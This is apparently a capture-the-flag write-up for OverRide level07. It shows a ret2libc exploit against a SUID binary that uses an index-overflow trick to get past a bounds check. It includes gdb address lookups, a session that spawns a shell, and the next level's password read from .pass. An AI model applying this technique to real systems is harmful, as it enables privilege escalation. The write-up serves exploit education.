# Level07

## Solution

* There is one file in our home, ```level07```, belonging to ```level08``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the disassembled code, but we will describe its behaviour:

	* ```main()``` first deletes all the arguments passed to the program and also the environment
	* it then allocates a on-stack ```0x64 int``` buffer
	* it asks the user to input a command :
		* ```store``` to call ```store_number()```
		* ```read``` to call ```read_number()```
		* ```quit``` to leave the program
	* ```store_number``` asks the user for a number and an index where to store this number in the ```main()``` buffer
	* if the index is a multiple of ```0x3``` or if ```(nb >> 0x18) == 0xb7```, ```store_number()``` refuses to store the number and returns ```1```
	* else it will store the number at the right index. As the buffer is filled with ```int```s, ```store_number()``` has actually to multiply the index by ```4``` and add it to the address of the buffer. For that, the assembly code uses a left bit shift of ```2```

* What we did with all of that:

	* our goal was to perform a ret2libc attack, using ```store_number``` to change values of former ```eip``` to ```system()``` address, and the content located ```4``` bytes after to a pointer to ```/bin/sh``` string
	* for that we needed several information:
		* offset between the buffer and the former ```eip``` location: ```0xffffd6cc - 0xffffd504 = 456``` bytes, that is to say ```456 / 4 = 114``` ints
		* ```system()``` address:
		```
		(gdb) p system
		$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
		```
		* as we could not store ```/bin/sh``` in a an env variable, we have to found an occurence in the program itself:
		```
		(gdb) find __libc_start_main,+99999999,"/bin/sh"
		0xf7f897ec
		warning: Unable to access target memory at 0xf7fd3b74, halting search.
		1 pattern found.
		```
		* in decimel, ```system()``` address is ```4159090384```; ```bin/sh``` address is ```4160264172```
	* one last problem: ```114``` is a multiple of ```3```, meaning that we could not access offset ```114 * 4 = 456``` by inputing ```114```.
	* then we had to find a number that would leads to the same result as ```114``` after a left bitshift of 2, without being a multiple of ```3```
	* as ```(int)114``` is ```0b00000000000000000000000001110010```, we had three candidates:
		* ```0b10000000000000000000000001110010 = 2147483762``` => not multiple of ```3```
		* ```0b01000000000000000000000001110010 = 1073741938``` => not multiple of ```3```
		* ```0b11000000000000000000000001110010 = 1610612850``` => multiple of ```3```
	* we could finally solve the level:
	```
	level07@OverRide:~$ ./level07
	----------------------------------------------------
	Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
		store - store a number into the data storage
		read  - read a number from the data storage
		quit  - exit the program
	----------------------------------------------------
	wil has reserved some storage :>
	----------------------------------------------------

	Input command: store
	Number: 4159090384
	Index: 2147483762
	Completed store command successfully
	Input command: store
	Number: 4160264172
	Index: 116
	Completed store command successfully
	Input command: quit
	$ cd ../level08
	$ cat .pass
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
	```
	